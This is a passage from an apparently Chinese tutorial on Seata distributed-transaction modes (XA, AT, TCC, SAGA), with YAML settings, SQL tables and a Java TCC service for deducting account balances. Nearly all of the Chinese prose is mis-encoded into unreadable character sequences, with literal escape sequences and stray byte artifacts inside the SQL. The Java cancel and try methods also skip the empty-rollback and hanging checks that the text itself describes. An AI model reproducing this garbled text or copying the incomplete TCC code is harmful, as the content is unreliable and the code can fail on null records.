æœ¬åœ°äº‹åŠ¡æ‰§è¡Œå®ŒæˆåæŠ¥å‘Šäº‹åŠ¡æ‰§è¡ŒçŠ¶æ€ç»™äº‹åŠ¡åè°ƒè€…ï¼Œæ­¤æ—¶äº‹åŠ¡ä¸æäº¤ï¼Œç»§ç»­æŒæœ‰DBé”\n\näºŒé˜¶æ®µï¼š\n\n- äº‹åŠ¡åè°ƒè€…åŸºäºä¸€é˜¶æ®µçš„æŠ¥å‘Šæ¥åˆ¤æ–­ä¸‹ä¸€æ­¥æ“ä½œ\n  - å¦‚æœä¸€é˜¶æ®µéƒ½æˆåŠŸï¼Œåˆ™é€šçŸ¥æ‰€æœ‰äº‹åŠ¡å‚ä¸è€…ï¼Œæäº¤äº‹åŠ¡\n  - å¦‚æœä¸€é˜¶æ®µä»»æ„ä¸€ä¸ªå‚ä¸è€…å¤±è´¥ï¼Œåˆ™é€šçŸ¥æ‰€æœ‰äº‹åŠ¡å‚ä¸è€…å›æ»šäº‹åŠ¡\n\n#### 2.Seataçš„XAæ¨¡å‹\n\nSeataå¯¹åŸå§‹çš„XAæ¨¡å¼åšäº†ç®€å•çš„å°è£…å’Œæ”¹é€ ï¼Œä»¥é€‚åº”è‡ªå·±çš„äº‹åŠ¡æ¨¡å‹ï¼ŒåŸºæœ¬æ¶æ„å¦‚å›¾ï¼š\n\n![](https://img.jwt1399.top/img/202210161438000.png)\n\nRMä¸€é˜¶æ®µçš„å·¥ä½œï¼š\n\n- a.æ³¨å†Œåˆ†æ”¯äº‹åŠ¡åˆ°TC\n\n- b.æ‰§è¡Œåˆ†æ”¯ä¸šåŠ¡sqlä½†ä¸æäº¤\n\n- c.æŠ¥å‘Šæ‰§è¡ŒçŠ¶æ€åˆ°TC\n\nTCäºŒé˜¶æ®µçš„å·¥ä½œï¼šTCæ£€æµ‹å„åˆ†æ”¯äº‹åŠ¡æ‰§è¡ŒçŠ¶æ€\n\n- a.å¦‚æœéƒ½æˆåŠŸï¼Œé€šçŸ¥æ‰€æœ‰RMæäº¤äº‹åŠ¡\n\n- b.å¦‚æœæœ‰å¤±è´¥ï¼Œé€šçŸ¥æ‰€æœ‰RMå›æ»šäº‹åŠ¡\n\nRMäºŒé˜¶æ®µçš„å·¥ä½œï¼šæ¥æ”¶TCæŒ‡ä»¤ï¼Œæäº¤æˆ–å›æ»šäº‹åŠ¡\n\n#### 3.ä¼˜ç¼ºç‚¹\n\nXAæ¨¡å¼çš„ä¼˜ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ\n\n- äº‹åŠ¡çš„å¼ºä¸€è‡´æ€§ï¼Œæ»¡è¶³ACIDåŸåˆ™ã€‚\n- å¸¸ç”¨æ•°æ®åº“éƒ½æ”¯æŒï¼Œå®ç°ç®€å•ï¼Œå¹¶ä¸”æ²¡æœ‰ä»£ç ä¾µå…¥\n\nXAæ¨¡å¼çš„ç¼ºç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ\n\n- å› ä¸ºä¸€é˜¶æ®µéœ€è¦é”å®šæ•°æ®åº“èµ„æºï¼Œç­‰å¾…äºŒé˜¶æ®µç»“æŸæ‰é‡Šæ”¾ï¼Œæ€§èƒ½è¾ƒå·®\n- ä¾èµ–å…³ç³»å‹æ•°æ®åº“å®ç°äº‹åŠ¡\n\n#### 4.å®ç°XAæ¨¡å¼\n\nSeataçš„starterå·²ç»å®Œæˆäº†XAæ¨¡å¼çš„è‡ªåŠ¨è£…é…ï¼Œå®ç°éå¸¸ç®€å•ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š\n\n1ï¼‰ä¿®æ”¹application.ymlæ–‡ä»¶ï¼ˆæ¯ä¸ªå‚ä¸äº‹åŠ¡çš„å¾®æœåŠ¡ï¼‰ï¼Œå¼€å¯XAæ¨¡å¼ï¼š\n\n```yaml\nseata:\n  data-source-proxy-mode: XA\n```\n\n2ï¼‰ç»™å‘èµ·å…¨å±€äº‹åŠ¡çš„å…¥å£æ–¹æ³•æ·»åŠ `@GlobalTransactional`æ³¨è§£:\n\næœ¬ä¾‹ä¸­æ˜¯OrderServiceImplä¸­çš„createæ–¹æ³•.\n\n![](https://img.jwt1399.top/img/202210161453759.png)\n\n3ï¼‰é‡å¯æœåŠ¡å¹¶æµ‹è¯•\n\né‡å¯order-serviceï¼Œå†æ¬¡æµ‹è¯•ï¼Œå‘ç°æ— è®ºæ€æ ·ï¼Œä¸‰ä¸ªå¾®æœåŠ¡éƒ½èƒ½æˆåŠŸå›æ»šã€‚\n\n### â·ATæ¨¡å¼\n\nATæ¨¡å¼åŒæ ·æ˜¯åˆ†é˜¶æ®µæäº¤çš„äº‹åŠ¡æ¨¡å‹ï¼Œä¸è¿‡ç¼ºå¼¥è¡¥äº†XAæ¨¡å‹ä¸­èµ„æºé”å®šå‘¨æœŸè¿‡é•¿çš„ç¼ºé™·ã€‚\n\n#### 1.Seataçš„ATæ¨¡å‹\n\n![åŸºæœ¬æµç¨‹å›¾](https://img.jwt1399.top/img/202210161454450.png)\n\né˜¶æ®µä¸€RMçš„å·¥ä½œï¼š\n\n- æ³¨å†Œåˆ†æ”¯äº‹åŠ¡\n- è®°å½•undo-logï¼ˆæ•°æ®å¿«ç…§ï¼‰\n- æ‰§è¡Œä¸šåŠ¡sqlå¹¶æäº¤\n- æŠ¥å‘Šäº‹åŠ¡çŠ¶æ€\n\né˜¶æ®µäºŒæäº¤æ—¶RMçš„å·¥ä½œï¼šåˆ é™¤undo-logå³å¯\n\né˜¶æ®µäºŒå›æ»šæ—¶RMçš„å·¥ä½œï¼šæ ¹æ®undo-logæ¢å¤æ•°æ®åˆ°æ›´æ–°å‰\n\n#### 2.æµç¨‹æ¢³ç†\n\næˆ‘ä»¬ç”¨ä¸€ä¸ªçœŸå®çš„ä¸šåŠ¡æ¥æ¢³ç†ä¸‹ATæ¨¡å¼çš„åŸç†ã€‚æ¯”å¦‚ï¼Œç°åœ¨æœ‰ä¸€ä¸ªæ•°æ®åº“è¡¨ï¼Œè®°å½•ç”¨æˆ·ä½™é¢ï¼š\n\n| **id** | **money** |\n| ------ | --------- |\n| 1      | 100       |\n\nå…¶ä¸­ä¸€ä¸ªåˆ†æ”¯ä¸šåŠ¡è¦æ‰§è¡Œçš„SQLä¸ºï¼š\n\n```sql\nupdate tb_account set money = money - 10 where id = 1\n```\n\nATæ¨¡å¼ä¸‹ï¼Œå½“å‰åˆ†æ”¯äº‹åŠ¡æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š\n\n| æµç¨‹å›¾                                                       | é˜¶æ®µ                                                         |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](../images/SpringCloud-é«˜çº§ç¯‡/image-20221016151005722.png) | é˜¶æ®µä¸€ï¼š<br/>1.TMå‘èµ·å¹¶æ³¨å†Œå…¨å±€äº‹åŠ¡åˆ°TC<br/>2.TMè°ƒç”¨åˆ†æ”¯äº‹åŠ¡<br/>3.åˆ†æ”¯äº‹åŠ¡å‡†å¤‡æ‰§è¡Œä¸šåŠ¡SQL<br/>4.RMæ‹¦æˆªä¸šåŠ¡SQLï¼Œæ ¹æ®whereæ¡ä»¶æŸ¥è¯¢åŸå§‹æ•°æ®ï¼Œå½¢æˆå¿«ç…§ã€‚<br/>5.RMæ‰§è¡Œä¸šåŠ¡SQLï¼Œæäº¤æœ¬åœ°äº‹åŠ¡ï¼Œé‡Šæ”¾æ•°æ®åº“é”ã€‚æ­¤æ—¶ `money = 90`<br/>6.RMæŠ¥å‘Šæœ¬åœ°äº‹åŠ¡çŠ¶æ€ç»™TC<br/>é˜¶æ®µäºŒï¼š<br/>1.TMé€šçŸ¥TCäº‹åŠ¡ç»“æŸ<br/>2.TCæ£€æŸ¥åˆ†æ”¯äº‹åŠ¡çŠ¶æ€<br/>  a.å¦‚æœéƒ½æˆåŠŸï¼Œåˆ™ç«‹å³åˆ é™¤å¿«ç…§<br/>  b.å¦‚æœæœ‰åˆ†æ”¯äº‹åŠ¡å¤±è´¥ï¼Œéœ€è¦å›æ»šã€‚è¯»å–å¿«ç…§æ•°æ®ï¼ˆ`{\"id\": 1, \"money\": 100}`ï¼‰ï¼Œå°†å¿«ç…§æ¢å¤åˆ°æ•°æ®åº“ã€‚æ­¤æ—¶æ•°æ®åº“å†æ¬¡æ¢å¤ä¸º100 |\n\n#### 3.ATä¸XAçš„åŒºåˆ«\n\nç®€è¿°ATæ¨¡å¼ä¸XAæ¨¡å¼æœ€å¤§çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ\n\n- XAæ¨¡å¼ä¸€é˜¶æ®µä¸æäº¤äº‹åŠ¡ï¼Œé”å®šèµ„æºï¼›ATæ¨¡å¼ä¸€é˜¶æ®µç›´æ¥æäº¤ï¼Œä¸é”å®šèµ„æºã€‚\n- XAæ¨¡å¼ä¾èµ–æ•°æ®åº“æœºåˆ¶å®ç°å›æ»šï¼›ATæ¨¡å¼åˆ©ç”¨æ•°æ®å¿«ç…§å®ç°æ•°æ®å›æ»šã€‚\n- XAæ¨¡å¼å¼ºä¸€è‡´ï¼›ATæ¨¡å¼æœ€ç»ˆä¸€è‡´\n\n#### 4.è„å†™é—®é¢˜\n\nåœ¨å¤šçº¿ç¨‹å¹¶å‘è®¿é—®ATæ¨¡å¼çš„åˆ†å¸ƒå¼äº‹åŠ¡æ—¶ï¼Œæœ‰å¯èƒ½å‡ºç°è„å†™é—®é¢˜ï¼Œå¦‚å›¾ï¼š\n\n![](https://img.jwt1399.top/img/202210161519740.png)\n\nè§£å†³æ€è·¯æ˜¯å¼•å…¥å…¨å±€é”æ¦‚å¿µã€‚åœ¨é‡Šæ”¾DBé”ä¹‹å‰ï¼Œå…ˆæ‹¿åˆ°å…¨å±€é”ã€‚é¿å…åŒä¸€æ—¶åˆ»æœ‰å¦å¤–ä¸€ä¸ªäº‹åŠ¡æ¥æ“ä½œå½“å‰æ•°æ®ã€‚\n\n![](https://img.jwt1399.top/img/202210161520005.png)\n\n#### 5.ä¼˜ç¼ºç‚¹\n\nATæ¨¡å¼çš„ä¼˜ç‚¹ï¼š\n\n- ä¸€é˜¶æ®µå®Œæˆç›´æ¥æäº¤äº‹åŠ¡ï¼Œé‡Šæ”¾æ•°æ®åº“èµ„æºï¼Œæ€§èƒ½æ¯”è¾ƒå¥½\n- åˆ©ç”¨å…¨å±€é”å®ç°è¯»å†™éš”ç¦»\n- æ²¡æœ‰ä»£ç ä¾µå…¥ï¼Œæ¡†æ¶è‡ªåŠ¨å®Œæˆå›æ»šå’Œæäº¤\n\nATæ¨¡å¼çš„ç¼ºç‚¹ï¼š\n\n- ä¸¤é˜¶æ®µä¹‹é—´å±äºè½¯çŠ¶æ€ï¼Œå±äºæœ€ç»ˆä¸€è‡´\n- æ¡†æ¶çš„å¿«ç…§åŠŸèƒ½ä¼šå½±å“æ€§èƒ½ï¼Œä½†æ¯”XAæ¨¡å¼è¦å¥½å¾ˆå¤š\n\n#### 6.å®ç°ATæ¨¡å¼\n\nATæ¨¡å¼ä¸­çš„å¿«ç…§ç”Ÿæˆã€å›æ»šç­‰åŠ¨ä½œéƒ½æ˜¯ç”±æ¡†æ¶è‡ªåŠ¨å®Œæˆï¼Œæ²¡æœ‰ä»»ä½•ä»£ç ä¾µå…¥ï¼Œå› æ­¤å®ç°éå¸¸ç®€å•ã€‚\n\nåªä¸è¿‡ï¼ŒATæ¨¡å¼éœ€è¦ä¸€ä¸ªè¡¨æ¥è®°å½•å…¨å±€é”ã€å¦ä¸€å¼ è¡¨æ¥è®°å½•æ•°æ®å¿«ç…§undo_logã€‚\n\n1ï¼‰å¯¼å…¥æ•°æ®åº“è¡¨ï¼Œè®°å½•å…¨å±€é”ï¼Œå³å¯¼å…¥æä¾›çš„Sqlæ–‡ä»¶ï¼šseata-at.sql\n\n- lock_tableå¯¼å…¥åˆ°TCæœåŠ¡å…³è”çš„æ•°æ®åº“ï¼Œ\n\n- undo_logè¡¨å¯¼å…¥åˆ°å¾®æœåŠ¡å…³è”çš„æ•°æ®åº“\n\n2ï¼‰ä¿®æ”¹application.ymlæ–‡ä»¶ï¼Œå°†äº‹åŠ¡æ¨¡å¼ä¿®æ”¹ä¸ºATæ¨¡å¼å³å¯ï¼š\n\n```yaml\nseata:\n  data-source-proxy-mode: AT # é»˜è®¤å°±æ˜¯AT\n```\n\n3ï¼‰é‡å¯æœåŠ¡å¹¶æµ‹è¯•\n\n### â¸TCCæ¨¡å¼\n\nTCCæ¨¡å¼ä¸ATæ¨¡å¼å¾ˆç›¸ä¼¼ï¼Œæ¯é˜¶æ®µéƒ½æ˜¯ç‹¬ç«‹äº‹åŠ¡ï¼Œä¸åŒçš„æ˜¯TCCé€šè¿‡äººå·¥ç¼–ç å®ç°æ•°æ®æ¢å¤ã€‚éœ€è¦å®ç°ä¸‰ä¸ªæ–¹æ³•ï¼š\n\n- Tryï¼šèµ„æºçš„æ£€æµ‹å’Œé¢„ç•™ï¼› \n\n- Confirmï¼šå®Œæˆèµ„æºæ“ä½œä¸šåŠ¡ï¼›è¦æ±‚ Try æˆåŠŸ Confirm ä¸€å®šè¦èƒ½æˆåŠŸã€‚\n\n- Cancelï¼šé¢„ç•™èµ„æºé‡Šæ”¾ï¼Œå¯ä»¥ç†è§£ä¸ºtryçš„åå‘æ“ä½œã€‚\n\n#### 1.Seataçš„TCCæ¨¡å‹\n\nSeataä¸­çš„TCCæ¨¡å‹ä¾ç„¶å»¶ç»­ä¹‹å‰çš„äº‹åŠ¡æ¶æ„ï¼Œå¦‚å›¾ï¼š\n\n![](https://img.jwt1399.top/img/202210171355418.png)\n\n#### 2.æµç¨‹åˆ†æ\n\n> ä¸¾ä¾‹ï¼Œä¸€ä¸ªæ‰£å‡ç”¨æˆ·ä½™é¢çš„ä¸šåŠ¡ã€‚å‡è®¾è´¦æˆ·AåŸæ¥ä½™é¢æ˜¯100ï¼Œéœ€è¦ä½™é¢æ‰£å‡30å…ƒã€‚\n\nåˆå§‹ä½™é¢ï¼š\n\n![](https://img.jwt1399.top/img/202210171401157.png)\n\n- **é˜¶æ®µä¸€ï¼ˆ Try ï¼‰**ï¼šæ£€æŸ¥ä½™é¢æ˜¯å¦å……è¶³ï¼Œå¦‚æœå……è¶³åˆ™å†»ç»“é‡‘é¢å¢åŠ 30å…ƒï¼Œå¯ç”¨ä½™é¢æ‰£é™¤30\n\n![](https://img.jwt1399.top/img/202210171401269.png)\n\næ­¤æ—¶ï¼Œæ€»é‡‘é¢ = å†»ç»“é‡‘é¢ + å¯ç”¨é‡‘é¢ï¼Œæ•°é‡ä¾ç„¶æ˜¯100ä¸å˜ã€‚äº‹åŠ¡ç›´æ¥æäº¤æ— éœ€ç­‰å¾…å…¶å®ƒäº‹åŠ¡ã€‚\n\n- **é˜¶æ®µäºŒï¼ˆConfirm)**ï¼šå‡å¦‚è¦æäº¤ï¼ˆConfirmï¼‰ï¼Œåˆ™å†»ç»“é‡‘é¢æ‰£å‡30\n\n![](https://img.jwt1399.top/img/202210171401837.png)\n\næ­¤æ—¶ï¼Œæ€»é‡‘é¢ = å†»ç»“é‡‘é¢ + å¯ç”¨é‡‘é¢ = 0 + 70  = 70å…ƒ\n\n- **é˜¶æ®µäºŒï¼ˆCanncelï¼‰**ï¼šå¦‚æœè¦å›æ»šï¼ˆCancelï¼‰ï¼Œåˆ™å†»ç»“é‡‘é¢æ‰£å‡30ï¼Œå¯ç”¨ä½™é¢å¢åŠ 30\n\n![](https://img.jwt1399.top/img/202210171401319.png)\n\n#### 3.ä¼˜ç¼ºç‚¹\n\nTCCæ¨¡å¼çš„æ¯ä¸ªé˜¶æ®µæ˜¯åšä»€ä¹ˆçš„ï¼Ÿ\n\n- Tryï¼šèµ„æºæ£€æŸ¥å’Œé¢„ç•™\n- Confirmï¼šä¸šåŠ¡æ‰§è¡Œå’Œæäº¤\n- Cancelï¼šé¢„ç•™èµ„æºçš„é‡Šæ”¾\n\nTCCçš„ä¼˜ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ\n\n- ä¸€é˜¶æ®µå®Œæˆç›´æ¥æäº¤äº‹åŠ¡ï¼Œé‡Šæ”¾æ•°æ®åº“èµ„æºï¼Œæ€§èƒ½å¥½\n- ç›¸æ¯”ATæ¨¡å‹ï¼Œæ— éœ€ç”Ÿæˆå¿«ç…§ï¼Œæ— éœ€ä½¿ç”¨å…¨å±€é”ï¼Œæ€§èƒ½æœ€å¼º\n- ä¸ä¾èµ–æ•°æ®åº“äº‹åŠ¡ï¼Œè€Œæ˜¯ä¾èµ–è¡¥å¿æ“ä½œï¼Œå¯ä»¥ç”¨äºéäº‹åŠ¡å‹æ•°æ®åº“\n\nTCCçš„ç¼ºç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ\n\n- æœ‰ä»£ç ä¾µå…¥ï¼Œéœ€è¦äººä¸ºç¼–å†™tryã€Confirmå’ŒCancelæ¥å£ï¼Œå¤ªéº»çƒ¦\n- è½¯çŠ¶æ€ï¼Œäº‹åŠ¡æ˜¯æœ€ç»ˆä¸€è‡´\n- éœ€è¦è€ƒè™‘Confirmå’ŒCancelçš„å¤±è´¥æƒ…å†µï¼Œåšå¥½å¹‚ç­‰å¤„ç†\n\n#### 4.äº‹åŠ¡æ‚¬æŒ‚å’Œç©ºå›æ»š\n\n##### 1ï¼‰ç©ºå›æ»š\n\nå½“æŸåˆ†æ”¯äº‹åŠ¡çš„tryé˜¶æ®µ**é˜»å¡**æ—¶ï¼Œå¯èƒ½å¯¼è‡´å…¨å±€äº‹åŠ¡è¶…æ—¶è€Œè§¦å‘äºŒé˜¶æ®µçš„cancelæ“ä½œã€‚åœ¨æœªæ‰§è¡Œtryæ“ä½œæ—¶å…ˆæ‰§è¡Œäº†cancelæ“ä½œï¼Œè¿™æ—¶cancelä¸èƒ½åšå›æ»šï¼Œå°±æ˜¯**ç©ºå›æ»š**ã€‚\n\n![](https://img.jwt1399.top/img/202210171406599.png)\n\næ‰§è¡Œcancelæ“ä½œæ—¶ï¼Œåº”å½“åˆ¤æ–­tryæ˜¯å¦å·²ç»æ‰§è¡Œï¼Œå¦‚æœå°šæœªæ‰§è¡Œï¼Œåˆ™åº”è¯¥ç©ºå›æ»šã€‚\n\n##### 2ï¼‰ä¸šåŠ¡æ‚¬æŒ‚\n\nå¯¹äºå·²ç»ç©ºå›æ»šçš„ä¸šåŠ¡ï¼Œä¹‹å‰è¢«é˜»å¡çš„tryæ“ä½œæ¢å¤ï¼Œç»§ç»­æ‰§è¡Œtryï¼Œå°±æ°¸è¿œä¸å¯èƒ½confirmæˆ–cancel ï¼Œäº‹åŠ¡ä¸€ç›´å¤„äºä¸­é—´çŠ¶æ€ï¼Œè¿™å°±æ˜¯**ä¸šåŠ¡æ‚¬æŒ‚**ã€‚\n\næ‰§è¡Œtryæ“ä½œæ—¶ï¼Œåº”å½“åˆ¤æ–­cancelæ˜¯å¦å·²ç»æ‰§è¡Œè¿‡äº†ï¼Œå¦‚æœå·²ç»æ‰§è¡Œï¼Œåº”å½“é˜»æ­¢ç©ºå›æ»šåçš„tryæ“ä½œï¼Œé¿å…æ‚¬æŒ‚\n\n#### 5.å®ç°TCCæ¨¡å¼\n\nè§£å†³ç©ºå›æ»šå’Œä¸šåŠ¡æ‚¬æŒ‚é—®é¢˜ï¼Œå¿…é¡»è¦è®°å½•å½“å‰äº‹åŠ¡çŠ¶æ€ï¼Œæ˜¯åœ¨tryã€è¿˜æ˜¯cancelï¼Ÿ\n\n##### 1ï¼‰æ€è·¯åˆ†æ\n\nå®šä¹‰ä¸€å¼ è¡¨ï¼š\n\n```sql\nCREATEÂ TABLEÂ `account_freeze_tbl`Â (\nÂ Â `xid`Â varchar(128)Â NOTÂ NULL,\nÂ Â `user_id`Â varchar(255)Â DEFAULTÂ NULLÂ COMMENTÂ 'ç”¨æˆ·id',\nÂ Â `freeze_money`Â int(11)Â unsignedÂ DEFAULTÂ '0'Â COMMENTÂ 'å†»ç»“é‡‘é¢',\nÂ Â `state`Â int(1)Â DEFAULTÂ NULLÂ COMMENTÂ 'äº‹åŠ¡çŠ¶æ€ï¼Œ0:tryï¼Œ1:confirmï¼Œ2:cancel',\nÂ Â PRIMARYÂ KEYÂ (`xid`)Â USINGÂ BTREE\n)Â ENGINE=InnoDBÂ DEFAULTÂ CHARSET=utf8Â ROW_FORMAT=COMPACT;\n\n```\n\nå…¶ä¸­ï¼š\n\n- xidï¼šæ˜¯å…¨å±€äº‹åŠ¡id\n- freeze_moneyï¼šç”¨æ¥è®°å½•ç”¨æˆ·å†»ç»“é‡‘é¢\n- stateï¼šç”¨æ¥è®°å½•äº‹åŠ¡çŠ¶æ€\n\né‚£æ­¤æ—¶ï¼Œæˆ‘ä»¬çš„ä¸šåŠ¡å¼€æ€ä¹ˆåšå‘¢ï¼Ÿ\n\n- Tryä¸šåŠ¡ï¼š\n  - è®°å½•å†»ç»“é‡‘é¢å’Œäº‹åŠ¡çŠ¶æ€åˆ°account_freezeè¡¨\n  - æ‰£å‡accountè¡¨å¯ç”¨é‡‘é¢\n- Confirmä¸šåŠ¡\n  - æ ¹æ®xidåˆ é™¤account_freezeè¡¨çš„å†»ç»“è®°å½•\n- Cancelä¸šåŠ¡\n  - ä¿®æ”¹account_freezeè¡¨ï¼Œå†»ç»“é‡‘é¢ä¸º0ï¼Œstateä¸º2\n  - ä¿®æ”¹accountè¡¨ï¼Œæ¢å¤å¯ç”¨é‡‘é¢\n- å¦‚ä½•åˆ¤æ–­æ˜¯å¦ç©ºå›æ»šï¼Ÿ\n  - cancelä¸šåŠ¡ä¸­ï¼Œæ ¹æ®xidæŸ¥è¯¢account_freezeï¼Œå¦‚æœä¸ºnullåˆ™è¯´æ˜tryè¿˜æ²¡åšï¼Œéœ€è¦ç©ºå›æ»š\n- å¦‚ä½•é¿å…ä¸šåŠ¡æ‚¬æŒ‚ï¼Ÿ\n  - tryä¸šåŠ¡ä¸­ï¼Œæ ¹æ®xidæŸ¥è¯¢account_freeze ï¼Œå¦‚æœå·²ç»å­˜åœ¨åˆ™è¯æ˜Cancelå·²ç»æ‰§è¡Œï¼Œæ‹’ç»æ‰§è¡Œtryä¸šåŠ¡\n\næ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ”¹é€ account-serviceï¼Œåˆ©ç”¨TCCå®ç°ä½™é¢æ‰£å‡åŠŸèƒ½ã€‚\n\n##### 2ï¼‰å£°æ˜TCCæ¥å£\n\nTCCçš„Tryã€Confirmã€Cancelæ–¹æ³•éƒ½éœ€è¦åœ¨æ¥å£ä¸­åŸºäºæ³¨è§£æ¥å£°æ˜ï¼Œ\n\næˆ‘ä»¬åœ¨account-serviceé¡¹ç›®ä¸­çš„`cn.itcast.account.service`åŒ…ä¸­æ–°å»ºä¸€ä¸ªæ¥å£ï¼Œå£°æ˜TCCä¸‰ä¸ªæ¥å£ï¼š\n\n```java\n@LocalTCC\npublic interface AccountTCCService {\n\n    @TwoPhaseBusinessAction(name = \"deduct\", commitMethod = \"confirm\", rollbackMethod = \"cancel\")\n    void deduct(@BusinessActionContextParameter(paramName = \"userId\") String userId,\n                @BusinessActionContextParameter(paramName = \"money\")int money);\n\n    boolean confirm(BusinessActionContext ctx);\n\n    boolean cancel(BusinessActionContext ctx);\n}\n```\n\n#### 3ï¼‰ç¼–å†™å®ç°ç±»\n\nåœ¨account-serviceæœåŠ¡ä¸­çš„`cn.itcast.account.service.impl`åŒ…ä¸‹æ–°å»ºä¸€ä¸ªç±»ï¼Œå®ç°TCCä¸šåŠ¡ï¼š\n\n```java\n@Service\n@Slf4j\npublic class AccountTCCServiceImpl implements AccountTCCService {\n\n    @Autowired\n    private AccountMapper accountMapper;\n    @Autowired\n    private AccountFreezeMapper freezeMapper;\n\n    @Override\n    @Transactional\n    public void deduct(String userId, int money) {\n        // 0.è·å–äº‹åŠ¡id\n        String xid = RootContext.getXID();\n        // 1.æ‰£å‡å¯ç”¨ä½™é¢\n        accountMapper.deduct(userId, money);\n        // 2.è®°å½•å†»ç»“é‡‘é¢ï¼Œäº‹åŠ¡çŠ¶æ€\n        AccountFreeze freeze = new AccountFreeze();\n        freeze.setUserId(userId);\n        freeze.setFreezeMoney(money);\n        freeze.setState(AccountFreeze.State.TRY);\n        freeze.setXid(xid);\n        freezeMapper.insert(freeze);\n    }\n\n    @Override\n    public boolean confirm(BusinessActionContext ctx) {\n        // 1.è·å–äº‹åŠ¡id\n        String xid = ctx.getXid();\n        // 2.æ ¹æ®idåˆ é™¤å†»ç»“è®°å½•\n        int count = freezeMapper.deleteById(xid);\n        return count == 1;\n    }\n\n    @Override\n    public boolean cancel(BusinessActionContext ctx) {\n        // 0.æŸ¥è¯¢å†»ç»“è®°å½•\n        String xid = ctx.getXid();\n        AccountFreeze freeze = freezeMapper.selectById(xid);\n\n        // 1.æ¢å¤å¯ç”¨ä½™é¢\n        accountMapper.refund(freeze.getUserId(), freeze.getFreezeMoney());\n        // 2.å°†å†»ç»“é‡‘é¢æ¸…é›¶ï¼ŒçŠ¶æ€æ”¹ä¸ºCANCEL\n        freeze.setFreezeMoney(0);\n        freeze.setState(AccountFreeze.State.CANCEL);\n        int count = freezeMapper.updateById(freeze);\n        return count == 1;\n    }\n}\n```\n\n### â¹SAGAæ¨¡å¼\n\nSaga æ¨¡å¼æ˜¯ Seata å³å°†å¼€æºçš„é•¿äº‹åŠ¡è§£å†³æ–¹æ¡ˆï¼Œå°†ç”±èš‚èšé‡‘æœä¸»è¦è´¡çŒ®ã€‚å…¶ç†è®ºåŸºç¡€æ˜¯Hector & Kenneth  åœ¨1987å¹´å‘è¡¨çš„è®ºæ–‡[Sagas](https://microservices.io/patterns/data/saga.html)ã€‚\n\nSeataå®˜ç½‘å¯¹äºSagaçš„æŒ‡å—ï¼šhttps://seata.io/zh-cn/docs/user/saga.html\n\n#### 1.åŸç†\n\nåœ¨ Saga æ¨¡å¼ä¸‹ï¼Œåˆ†å¸ƒå¼äº‹åŠ¡å†…æœ‰å¤šä¸ªå‚ä¸è€…ï¼Œæ¯ä¸€ä¸ªå‚ä¸è€…éƒ½æ˜¯ä¸€ä¸ªå†²æ­£è¡¥å¿æœåŠ¡ï¼Œéœ€è¦ç”¨æˆ·æ ¹æ®ä¸šåŠ¡åœºæ™¯å®ç°å…¶æ­£å‘æ“ä½œå’Œé€†å‘å›æ»šæ“ä½œã€‚\n\nåˆ†å¸ƒå¼äº‹åŠ¡æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œä¾æ¬¡æ‰§è¡Œå„å‚ä¸è€…çš„æ­£å‘æ“ä½œï¼Œå¦‚æœæ‰€æœ‰æ­£å‘æ“ä½œå‡æ‰§è¡ŒæˆåŠŸï¼Œé‚£ä¹ˆåˆ†å¸ƒå¼äº‹åŠ¡æäº¤ã€‚å¦‚æœä»»ä½•ä¸€ä¸ªæ­£å‘æ“ä½œæ‰§è¡Œå¤±è´¥ï¼Œé‚£ä¹ˆåˆ†å¸ƒå¼äº‹åŠ¡ä¼šå»é€€å›å»æ‰§è¡Œå‰é¢å„å‚ä¸è€…çš„é€†å‘å›æ»šæ“ä½œï¼Œå›æ»šå·²æäº¤çš„å‚ä¸è€…ï¼Œä½¿åˆ†å¸ƒå¼äº‹åŠ¡å›åˆ°åˆå§‹çŠ¶æ€ã€‚\n\n![](../images/SpringCloud-é«˜çº§ç¯‡/image-20210724184846396.png)\n\nSagaä¹Ÿåˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼š\n\n- ä¸€é˜¶æ®µï¼šç›´æ¥æäº¤æœ¬åœ°äº‹åŠ¡\n- äºŒé˜¶æ®µï¼šæˆåŠŸåˆ™ä»€ä¹ˆéƒ½ä¸åšï¼›å¤±è´¥åˆ™é€šè¿‡ç¼–å†™è¡¥å¿ä¸šåŠ¡æ¥å›æ»š\n\n\n\n#### 2.ä¼˜ç¼ºç‚¹\n\nä¼˜ç‚¹ï¼š\n\n- äº‹åŠ¡å‚ä¸è€…å¯ä»¥åŸºäºäº‹ä»¶é©±åŠ¨å®ç°å¼‚æ­¥è°ƒç”¨ï¼Œååé«˜\n- ä¸€é˜¶æ®µç›´æ¥æäº¤äº‹åŠ¡ï¼Œæ— é”ï¼Œæ€§èƒ½å¥½\n- ä¸ç”¨ç¼–å†™TCCä¸­çš„ä¸‰ä¸ªé˜¶æ®µï¼Œå®ç°ç®€å•\n\nç¼ºç‚¹ï¼š\n\n- è½¯çŠ¶æ€æŒç»­æ—¶é—´ä¸ç¡®å®šï¼Œæ—¶æ•ˆæ€§å·®\n- æ²¡æœ‰é”ï¼Œæ²¡æœ‰äº‹åŠ¡éš”ç¦»ï¼Œä¼šæœ‰è„å†™\n\n### âºå››ç§æ¨¡å¼å¯¹æ¯”\n\næˆ‘ä»¬ä»ä»¥ä¸‹å‡ ä¸ªæ–¹é¢æ¥å¯¹æ¯”å››ç§å®ç°ï¼š\n\n- ä¸€è‡´æ€§ï¼šèƒ½å¦ä¿è¯äº‹åŠ¡çš„ä¸€è‡´æ€§ï¼Ÿå¼ºä¸€è‡´è¿˜æ˜¯æœ€ç»ˆä¸€è‡´ï¼Ÿ\n- éš”ç¦»æ€§ï¼šäº‹åŠ¡ä¹‹é—´çš„éš”ç¦»æ€§å¦‚ä½•ï¼Ÿ\n- ä»£ç ä¾µå…¥ï¼šæ˜¯å¦éœ€è¦å¯¹ä¸šåŠ¡ä»£ç æ”¹é€ ï¼Ÿ\n- æ€§èƒ½ï¼šæœ‰æ— æ€§èƒ½æŸè€—ï¼Ÿ\n- åœºæ™¯ï¼šå¸¸è§çš„ä¸šåŠ¡åœºæ™¯\n\n![](https://img.jwt1399.top/img/202210161540817.png)\n\n## â„é«˜å¯ç”¨\n\n### 